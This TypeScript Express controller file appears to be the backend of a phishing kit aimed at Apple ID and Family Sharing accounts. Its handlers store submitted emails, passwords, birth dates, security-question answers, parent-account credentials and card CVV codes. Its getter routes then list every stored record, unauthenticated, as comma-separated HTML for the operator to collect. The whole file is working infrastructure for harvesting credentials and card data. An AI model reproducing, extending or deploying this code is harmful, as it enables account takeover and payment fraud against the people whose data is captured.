import { Request, Response } from "express";
import {
  AppleAccountProps,
  AppleAccountWithParentProps,
  ParentProps,
} from "../type";
import Unknown from "../models/unknownModel";
import AppleAccount from "../models/appleAccountModel";
import AccountWithParent from "../models/accountWithParentModel";
import Parent from "../models/parentModel";
import Error from "../models/errorModel";

export const addAccount = async (
  req: Request<{}, {}, Omit<AppleAccountProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    const existingAccount = await AppleAccount.findOne({
      email: account.email,
    });

    if (existingAccount) {
      res.status(201).send("Account already exists");
      return;
    }

    await AppleAccount.create(account);

    res.status(201).send("Account added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const addUnknown = async (
  req: Request<{}, {}, Omit<AppleAccountWithParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await Unknown.create(account);

    res.status(201).send("Unknown added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const addParent = async (
  req: Request<{}, {}, Omit<ParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const parent = req.body;

    if (Object.keys(parent).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    const existingParent = await Parent.findOne({ email: parent.email });

    if (existingParent) {
      res.status(201).send("Parent already exists");
      return;
    }

    await Parent.create(parent);

    res.status(201).send("Parent added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the parent");
  }
};

export const addError = async (
  req: Request<{}, {}, Omit<ParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const parent = req.body;

    if (Object.keys(parent).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await Error.create(parent);

    res.status(201).send("Error added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the error");
  }
};

export const addAccountWithParent = async (
  req: Request<{}, {}, Omit<AppleAccountWithParentProps, "_id" | "createdAt">>,
  res: Response
) => {
  try {
    const account = req.body;

    if (Object.keys(account).length === 0) {
      res.status(400).send("Invalid request");
      return;
    }

    await AccountWithParent.create(account);

    res.status(201).send("Account added successfully");
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong adding the account");
  }
};

export const getAccounts = async (req: Request, res: Response) => {
  try {
    const accounts = await AppleAccount.find();

    const accountText = accounts
      .map(
        ({ email, password, date, first_q, second_q, third_q }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the accounts");
  }
};

export const getUnknowns = async (req: Request, res: Response) => {
  try {
    const accounts = await Unknown.find();

    const accountText = accounts
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          first_name,
          last_name,
          parent_email,
          parent_password,
          parent_date,
          parent_first_q,
          parent_second_q,
          parent_third_q,
          cvv,
          url,
        }) =>
          cvv
            ? `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
            : `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${url}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the unknowns");
  }
};

export const getParentsCvv = async (req: Request, res: Response) => {
  try {
    const parents = await Parent.find();

    const parentText = parents
      .filter((parent) => parent.cvv)
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          cvv,
          no2,
          url2,
          stop_sharing,
          no_of_family,
        }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${no2},${url2},${stop_sharing},${no_of_family}`
      )
      .join("<br />");

    res.status(200).send(`<p>${parentText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the parents");
  }
};

export const getParentsUrl = async (req: Request, res: Response) => {
  try {
    const parents = await Parent.find();

    const parentText = parents
      .filter((parent) => parent.url)
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          no,
          url,
          no2,
          url2,
          stop_sharing,
          no_of_family,
        }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${no2},${url2},${stop_sharing},${no_of_family}`
      )
      .join("<br />");

    res.status(200).send(`<p>${parentText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the parents");
  }
};

export const getErrors = async (req: Request, res: Response) => {
  try {
    const parents = await Error.find();

    const parentText = parents
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          cvv,
          no,
          url,
          stop_sharing,
          no_of_family,
        }) =>
          cvv
            ? `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
            : `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`
      )
      .join("<br />");

    res.status(200).send(`<p>${parentText}</p>`);
  } catch (error) {
    res.status(500).send("Something went wrong getting the errors");
  }
};

export const getAccountsWithParent = async (req: Request, res: Response) => {
  try {
    const accounts = await AccountWithParent.find();

    const accountText = accounts
      .map(
        ({
          email,
          password,
          date,
          first_q,
          second_q,
          third_q,
          first_name,
          last_name,
          parent_email,
          parent_password,
          parent_date,
          parent_first_q,
          parent_second_q,
          parent_third_q,
          cvv,
        }) =>
          `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
      )
      .join("<br />");

    res.status(200).send(`<p>${accountText}</p>`);
  } catch (error) {
    res
      .status(500)
      .send("Something went wrong getting the accounts with parent");
  }
};
